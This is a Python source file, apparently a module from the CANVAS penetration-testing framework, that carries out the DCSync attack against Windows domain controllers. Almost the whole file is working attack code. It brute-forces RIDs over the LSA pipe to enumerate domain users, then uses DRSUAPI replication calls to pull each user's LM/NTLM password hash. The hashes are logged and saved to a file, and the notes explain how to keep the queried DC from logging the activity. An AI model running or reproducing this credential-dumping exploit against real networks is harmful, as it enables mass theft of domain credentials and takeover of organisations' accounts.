#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  dcsync.py
## Description:
##            :
## Created_On :  Wed Oct 7 CEST 2015
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
###############################################################################

import sys
import os
import socket
import time
import logging

if '.' not in sys.path:
    sys.path.append('.')

NAME                            = 'DCsync'
DESCRIPTION                     = 'Retrieves the LM/NTLM hashes of domain users using the DRSUAPI.'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Microsoft'
DOCUMENTATION['Date public']    = ''
DOCUMENTATION['Repeatability']  = ''

VERSION                         = '1.0'
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Commands'
PROPERTY['SITE']                = 'Remote'
PROPERTY['ARCH']                = [ ["Windows"] ]
PROPERTY['VERSION']             = ['2003', '2008', '2012']

CHANGELOG = """
"""

NOTES = """
This module implements the so-called DCSync attack. An attacker with either a domain
administrator (ie: his password or his NTLM hash) or DC account is able to use
the DRSUAPI in order to retrieve sensitive user data including (but not limited to)
their NTLM hashes.

To compile the list of users, the module uses the so-called RID bruteforce technique
also used in the userenum module.

Note:
    a) This will generate logs on the queried DC unless you use a DC account.
    b) This is perfectly safe from a DoS point of view. In the worse case, the
       module just won't work.

References:
    https://github.com/gentilkiwi/mimikatz/releases
    https://github.com/CoreSecurity/impacket
    http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/
    https://msdn.microsoft.com/en-us/library/cc228086.aspx
    https://msdn.microsoft.com/en-us/library/windows/desktop/ms681390(v=vs.85).aspx
    http://www.kouti.com/tables/userattributes.htm
    https://msdn.microsoft.com/en-us/library/cc245507.aspx

Tested against:
    - Windows Server 2003 R2 (x86)
    - Windows Server 2008 R2 (amd64)
    - Windows Server 2012 R2 (amd64)
"""

import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit
import libs.kerberos.ccache as cc
import libs.newsmb.lsarpc as lsa
import libs.newsmb.drsuapi as drs

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.result       = ""
        self.name         = NAME
        self.user         = u""
        self.password     = u""
        self.domain       = u"WORKGROUP"
        self.ccache_file  = None
        self.use_kerberos = False
        self.savefile     = "passwordhashes.txt"

        #we do a relatively small number by default
        #since most of the ones we are interested in are right there
        #and doing a lot of them makes our lives extremely slow!
        self.startrid     = None
        self.endrid       = None


    def getargs(self):
        """
        Parsing of CLI/GUI arguments.
        """
        self.user = self.argsDict.get("user",self.user)
        self.password = self.argsDict.get("password",self.password)
        self.domain = self.argsDict.get('domain', self.domain)
        self.ccache_file = self.argsDict.get('krb5_ccache', self.ccache_file)
        self.savefile = self.argsDict.get("savefile", self.savefile)

        try:
            self.startrid = int(self.argsDict.get("startrid", self.startrid))
        except Exception as e:
            self.startrid = None
        try:
            self.endrid = int(self.argsDict.get("endrid", self.endrid))
        except Exception as e:
            self.endrid = None


    def check_ccache_file(self):
        """
        Returns True if the credential file is usable.
        """
        try:
            # Can we open the credential file?
            cc1 = cc.CCache()
            cc1.open(self.ccache_file, new=0)
            # Is the DB related to the username?
            principal = cc1.get_primary_principal()
            user_domain = '@'.join([self.user,self.domain]).lower()
            if user_domain != principal.lower():
                return False

            # Do we have credential information that is not only configuration?
            creds = cc1.get_credentials()
            found_valid_creds = 0
            for cred in creds:
                if not cred.is_config_credential():
                    found_valid_creds = 1
            if not found_valid_creds:
                return False
            else:
                return True
        except Exception as e:
            return False
        else:
            return True

    def getAllUsers(self):
        """
        Get All Users using the LSASRV API.
        Returns a list of user/sid
        """

        userlist = []
        lsaobj = lsa.LSAClient(self.target.interface)
        lsaobj.set_credentials(self.user,
                               self.password,
                               self.domain,
                               use_krb5=self.use_kerberos,
                               kerberos_db=self.ccache_file)
        if not lsaobj.bind():
            logging.error("Connection to LSA pipe failed.")
            return userlist

        try:
            domains = lsaobj.lookup_domains()
        except lsa.LSALookUpNamesException as e:
            logging.error('Couldn\'t find any suitable domain SID.')
            return userlist

        if domains == None or not len(domains):
            logging.error('Couldn\'t find any suitable domain SID.')
            return userlist

        # At this point we may have found a server associated with one or maybe
        # several domains.
        for dom in domains:

                # At this point we can now start the bruteforce. Basically if the forged
                # SID doesn't belong to any user, STATUS_NONE_MAPPED (0xc0000073) is
                # returned by the API otherwise if the SID does indeed belong to a valid
                # user, its name is returned/leaked.
                logging.info('Found the domain %s with SID %s' % (dom['Name'], dom['Sid']))

                # Credits go to
                # http://stackoverflow.com/questions/312443/how-do-you-split-a-list-into-evenly-sized-chunks-in-python
                def chunks(l, n):
                    """Yield successive n-sized chunks from l."""
                    for i in xrange(0, len(l), n):
                        yield l[i:i+n]

                # The user may have specified an alternate range of RID to bf.
                if self.startrid:
                    if not self.endrid or self.endrid < self.startrid:
                        logging.error('Faulty or unspecified end of the RID range. Assuming a default value.')
                        self.endrid = self.startrid + 80
                    rid_lists = list(chunks(range(self.startrid, self.endrid), 80))
                else:
                    rid_lists = []
                    rid_lists.append([i for i in xrange(500, 580+1)])
                    rid_lists.append([i for i in xrange(1000, 1080+1)])
                    rid_lists.append([i for i in xrange(1100, 1180+1)])
                    rid_lists.append([i for i in xrange(1200, 1280+1)]) # Theoretical
                    rid_lists.append([i for i in xrange(1300, 1380+1)]) # Theoretical
                    rid_lists.append([i for i in xrange(1400, 1480+1)]) # Theoretical

                for rid_list in rid_lists:
                    logging.info('Bruteforcing on range [%d,%d]' % (rid_list[0], rid_list[-1]))
                    sid_list = [dom['Sid'] + '-' + str(i) for i in xrange(rid_list[0], rid_list[-1])]

                    try:
                        names = lsaobj.lookup_sids(sid_list)
                    except lsa.LSALookUpSidsException as e:
                        if e.status == 0xc0000073:
                            continue
                        else:
                            logging.info('LSALookUpSids() failed with unknown error: %s' % str(e))
                    else:
                        for name in names:
                            if name['Type'] == lsa.SIDTYPEUSER:
                                username = name['Name'].decode('UTF-16LE').encode('ascii')
                                sid = name['Sid']
                                userlist.append((username,sid))
                            if name['Type'] == lsa.SIDTYPEGROUP:
                                groupname = name['Name'].decode('UTF-16LE').encode('ascii')
        return userlist

    def run(self):

        self.setInfo("%s" % NAME)
        self.getargs()

        # We need a directory to save results
        node = self.argsDict["passednodes"][0]
        self.savepath = self.output(ip=node.get_interesting_interface(), subdir="PasswordHashes")

        # Patch to have GUI and CLI synchronized
        if not self.ccache_file:
            self.ccache_file = None

        userlist = []
        if self.version == 0:
            osd=self.engine.getModuleExploit("osdetect")
            osd.link(self)
            #if we do language detection, then we will also do userenum
            #which is a deadly circle
            osd.argsDict["nolanguagedetect"] = True
            osd.run()
            osstr = str(osd.result)
            logging.info("OS Detected: %s" % osstr)
        elif self.version == 1:
            osstr = "Windows"
        else:
            logging.info("No OS Detected and version not chosen - ignoring host")

        # Sanity check: the domain
        if not len(self.domain):
            logging.error("Empty domain, abording DCSync attack.")
            return 0

        # Sanity check: the ccache credentials
        if self.ccache_file:
            if not self.check_ccache_file():
                logging.error('%s doesn\'t seem to be a valid ccache file for user %s'
                              % (self.ccache_file, '@'.join([self.user,self.domain])))
                return 0
            else:
                self.use_kerberos = True
                logging.info("Using kerberos authentication with credentials %s" % self.ccache_file)
        else:
            logging.info("Using NTLM authentication")

        # Do we even target an SMB server?
        if not self.has_named_pipes(self.target):
            logging.error("Cannot retrieve the list of users on %s" % self.target.interface)
            return 0

        # Retrieving the user list
        logging.info("Checking all users")
        userlist = self.getAllUsers()
        if not userlist:
            logging.error("No users found, aborting DCSync attack.")
            return 0

        logging.info("Found %d valid domain users:" % len(userlist))
        for user in userlist:
            logging.info('SID:%s, Username:%s' % (user[1], user[0]))

        # At this point we can now use the DRSUAPI to retrieve user data
        try:
            sid_list = [ user[1] for user in userlist ]
            status, results = drs.drs_get_hashes(self.target.interface,
                                                 sid_list,
                                                 self.user,
                                                 self.password,
                                                 self.domain,
                                                 use_krb5=self.use_kerberos,
                                                 kerberos_db=self.ccache_file)
        except drs.DRSUAPIGetDomainControllerInfoException as e:
            logging.error("Please specify a valid domain")
            return 0
        except Exception as e:
            logging.error("%s" % str(e))
            return 0

        # If the list is empty, it's useless to go further.
        # Note: This should be not happen practically speaking unless the specific
        # RID range selected by the user is a wrong guess.
        if not status:
            logging.error("Cannot retrieve the hashes of users on %s: %s" % (self.target.interface, str(results)))
            return 0

        # The operation was a success, we can now report the list of LM/NTLM hashes
        logging.info("Successfully retrieved the LM/NTLM hashes of these users")

        logs = ''
        for i in xrange(len(results)):
            lm_str = results[i][1]
            ntlm_str = results[i][2]
            if not lm_str:
                lm_str = '*'*32
            else:
                lm_str = lm_str.encode('hex')
            if not ntlm_str:
                ntlm_str = '*'*32
            else:
                ntlm_str = ntlm_str.encode('hex')
            line = "%s:%s:%s" % (userlist[i][0], lm_str, ntlm_str)
            logs += line + '\n'
            logging.info(line)

        # We may need to save these credentials
        save_loc = os.path.join(self.savepath, self.savefile)
        try:
            fd = open(save_loc,"a")
            fd.write(logs)
            fd.close()
        except Exception as e:
            logging.warning('Could not save the password hashes in %s' % save_loc)
        else:
            logging.info("Saved password hashes to: %s" % save_loc)

        self.setInfo("%s - done (success: %s)" % (NAME, "%d users found" % len(userlist)))
        return 1

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
